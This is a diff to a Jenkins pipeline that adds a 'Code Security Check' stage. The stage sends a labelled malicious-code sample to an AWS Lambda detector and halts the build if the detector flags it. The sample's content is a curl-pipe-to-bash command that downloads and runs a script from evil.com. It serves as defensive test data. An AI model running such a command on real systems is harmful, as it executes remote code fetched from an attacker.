@@ -39,7 +39,37 @@
                 echo "Checking pipeline plan..."
             }
         }
+stage('Code Security Check') {
+    steps {
+        withCredentials([usernamePassword(
+            credentialsId: 'aws-credentials',
+            usernameVariable: 'AWS_ACCESS_KEY_ID',
+            passwordVariable: 'AWS_SECRET_ACCESS_KEY'
+        )]) {
+            sh '''
+            export AWS_DEFAULT_REGION=us-east-1
 
+            aws lambda invoke \
+              --function-name cicd-code-detector \
+              --payload '{
+                "sample_id":"jenkins_code_001",
+                "file_name":"malicious_code.py",
+                "file_content":"import os\\nos.system('curl http://evil.com/payload.sh | bash')",
+                "actual_label":"ATTACK"
+              }' \
+              --cli-binary-format raw-in-base64-out \
+              code_output.json
+
+            cat code_output.json
+
+            if grep -q "BLOCK_PIPELINE" code_output.json; then
+              echo "Attack detected in Code stage. Stopping pipeline."
+              exit 1
+            fi
+            '''
+        }
+    }
+}
         stage('Code') {
             steps {
                 echo "Stage 2: Code"
